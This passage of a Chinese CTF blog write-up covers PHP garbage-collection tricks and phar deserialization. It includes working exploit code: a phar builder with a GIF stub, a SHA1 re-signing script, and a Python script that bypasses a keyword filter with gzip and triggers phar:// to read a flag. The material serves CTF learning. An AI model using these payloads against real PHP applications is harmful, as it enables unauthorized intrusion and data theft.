</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;demo.phar&#39;</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>     
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$o</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span><span class=s2>&#34;test&#34;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span> 
</span></span></code></pre></td></tr></table></div></div><p>然后拖进<code>010editor</code>进行修改</p><p>再重新生成签名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;demo.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> 
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span> <span class=c1># 获取要签名的数据</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span> <span class=c1># 获取签名类型和GBMB标识</span>
</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span> <span class=c1># 数据 + 签名 + (类型 + GBMB)</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;newtest.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span> <span class=c1># 写入新文件</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-213722.png width=1056 height=447 loading=lazy alt=4></p><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-213728.png width=1062 height=549 loading=lazy alt=5></p><p>欧克好起来了，那么利用看看那</p><p><img src=/p/php-gc-mechanism-and-common-exploitation/QQ20240914-214000.png width=1459 height=879 loading=lazy alt=6></p><p>这就是回收机制嘛，好嗨哟</p><h4 id=demo-2-1>Demo 2</h4><p>emm我没找到，但是看了还是很基础的一道题</p><p><strong>[NSSCTF]prize_p1</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>getflag</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nx>getenv</span><span class=p>(</span><span class=s2>&#34;FLAG&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$config</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span> <span class=o>==</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>die</span><span class=p>(</span><span class=s2>&#34;我知道你想干吗，我的建议是不要那样做。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=nx>file_put_contents</span><span class=p>(</span><span class=s2>&#34;./tmp/a.txt&#34;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>config</span> <span class=o>==</span> <span class=s1>&#39;r&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;</span><span class=p>,</span> <span class=nv>$data</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>die</span><span class=p>(</span><span class=s2>&#34;我知道你想干吗，我的建议是不要那样做。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/get|flag|post|php|filter|base64|rot13|read|data/i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;我知道你想干吗，我的建议是不要那样做。&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Error</span><span class=p>(</span><span class=s2>&#34;那么就从这里开始起航吧&#34;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>过滤的东西很多但是<code>phar</code>没有被过滤所以直接上就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>getflag</span><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$o</span><span class=o>=</span><span class=k>new</span> <span class=nx>getflag</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nv>$o</span><span class=p>,</span><span class=k>null</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unlink</span><span class=p>(</span><span class=s2>&#34;demo.phar&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>=</span><span class=k>new</span> <span class=nx>Phar</span><span class=p>(</span><span class=s1>&#39;demo.phar&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>startBuffering</span><span class=p>();</span>     
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setStub</span><span class=p>(</span><span class=s2>&#34;GIF89a&lt;?php __HALT_COMPILER();?&gt;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>setMetadata</span><span class=p>(</span><span class=nv>$c</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>addFromString</span><span class=p>(</span><span class=s2>&#34;test.txt&#34;</span><span class=p>,</span><span class=s2>&#34;test&#34;</span><span class=p>);</span>  
</span></span><span class=line><span class=cl><span class=nv>$phar</span><span class=o>-&gt;</span><span class=na>stopBuffering</span><span class=p>();</span> 
</span></span></code></pre></td></tr></table></div></div><p>一样的进行签名的修复</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>sha1</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;demo.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>f</span> <span class=o>=</span> <span class=n>file</span><span class=o>.</span><span class=n>read</span><span class=p>()</span> 
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>f</span><span class=p>[:</span><span class=o>-</span><span class=mi>28</span><span class=p>]</span> <span class=c1># 获取要签名的数据</span>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>f</span><span class=p>[</span><span class=o>-</span><span class=mi>8</span><span class=p>:]</span> <span class=c1># 获取签名类型和GBMB标识</span>
</span></span><span class=line><span class=cl><span class=n>newf</span> <span class=o>=</span> <span class=n>s</span> <span class=o>+</span> <span class=n>sha1</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>digest</span><span class=p>()</span> <span class=o>+</span> <span class=n>h</span> <span class=c1># 数据 + 签名 + (类型 + GBMB)</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;newtest.phar&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>newf</span><span class=p>)</span> <span class=c1># 写入新文件</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>A</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$config</span><span class=o>=</span><span class=s2>&#34;w&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=c1>//public $config=&#34;r&#34;;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>A</span><span class=p>());</span>
</span></span></code></pre></td></tr></table></div></div><p>写个脚本打入读取<code>flag</code>即可(先写入<code>/tmp</code>,再进行读取)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>gzip</span> 
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s2>&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>=</span><span class=nb>open</span><span class=p>(</span><span class=s2>&#34;./newtest.phar&#34;</span><span class=p>,</span><span class=s2>&#34;rb&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file_out</span><span class=o>=</span><span class=n>gzip</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;./phar.zip&#34;</span><span class=p>,</span><span class=s2>&#34;wb+&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file_out</span><span class=o>.</span><span class=n>writelines</span><span class=p>(</span><span class=n>file</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>file_out</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>file</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>params</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>:</span><span class=s1>&#39;O:1:&#34;A&#34;:1:{s:6:&#34;config&#34;;s:1:&#34;w&#34;;}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>:</span><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;./phar.zip&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=n>params</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>:</span><span class=s1>&#39;O:1:&#34;A&#34;:1:{s:6:&#34;config&#34;;s:1:&#34;r&#34;;}&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=mi>0</span><span class=p>:</span><span class=s1>&#39;phar://./tmp/a.txt&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=s1>&#39;(NSSCTF\{.+?\})&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>target</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>应该是能行的，不行的话稍微改改也行估计</p><h1 id=0x03-小结>0x03 小结</h1><p>中途研究机制的时候和利用感觉差远了，有点扯远了的感觉，但是后面确实是通过GC回收机制更加的清楚绕过的手法原理，之前只知道改一下<code>payload</code>可以绕过，现在知道为啥了</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>